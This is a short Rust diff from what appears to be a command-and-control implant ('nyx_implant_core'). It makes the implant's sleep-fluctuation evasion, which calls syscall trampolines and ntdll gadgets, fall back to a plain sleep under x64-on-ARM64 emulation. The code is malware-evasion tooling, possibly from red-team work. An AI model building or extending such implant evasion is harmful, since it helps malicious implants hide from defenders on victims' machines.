@@ -43,6 +43,15 @@ pub fn sleep(seconds: u32) {
         crate::sleep::sleep_seconds(seconds);
         return;
     }
+    // x64-on-ARM64 emulation (Prism): the fluctuation chain calls the syscall
+    // trampoline directly, bypassing the syscallN shims' direct-mode fallback,
+    // and executing a trampoline stub is fatal there (0xC000026F raised at the
+    // ntdll gadget). Degrade to the plain sleep — the same noevasion-degrade
+    // convention as the Runtime's direct mode.
+    if nyx_implant_core::syscalls::is_x64_emulated_on_arm64() {
+        crate::sleep::sleep_seconds(seconds);
+        return;
+    }
     if unsafe { !do_fluctuate(seconds) } {
         crate::sleep::sleep_seconds(seconds);
     }
